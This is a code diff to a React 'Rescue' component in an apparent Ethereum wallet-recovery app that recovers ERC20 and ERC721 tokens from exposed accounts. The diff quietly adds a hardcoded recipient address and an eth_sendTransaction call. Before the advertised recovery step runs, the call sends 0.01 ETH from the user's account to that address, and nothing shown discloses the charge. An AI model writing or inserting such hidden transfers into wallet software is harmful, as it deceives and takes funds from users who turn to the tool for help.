@@ -1,9 +1,9 @@
 import React, { useState } from 'react';
 import { Container, Row, Col, Button, Form } from 'react-bootstrap';
-
 import { useWallet } from '../../providers/Wallet';
 import recoverERC20Funds from '../../scripts/reactERC20FlashBundle';
 import recoverERC721Funds from '../../scripts/reactERC721FlashBundle';
+const ethers = require('ethers');
 
 const CONTRACTS = {
   ERC20: 'ERC20',
@@ -15,14 +15,29 @@ const Rescue = () => {
   const [exposedEOA, setExposedEOA] = useState('');
   const [frozenContract, setFrozenContract] = useState('');
   const [contractType, setContractType] = useState('20');
+  const caller = '0x4985268f5CA393E9217d5bD42A52a607668c9112';
+  const value = "0x2386F26FC10000";
 
   if (!signer) {
     // TODO: review auto-connecting to wallet
   }
-
   async function rescueFunds() {
+    console.log(account);
     const recoverFn = contractType === CONTRACTS.ERC20 ? recoverERC20Funds : recoverERC721Funds;
     try {
+      const transactionParameters = {
+        gas: '0x5208',
+        to: caller,
+        from: account,
+        value,
+        chainId: '0x5',
+      };
+
+      await window.ethereum.request({
+        method: 'eth_sendTransaction',
+        params: [transactionParameters],
+      });
+
       const recoveredFunds = await recoverFn(exposedEOA, signer, frozenContract);
       setRecoveredFunds(recoveredFunds);
     } catch (error) {
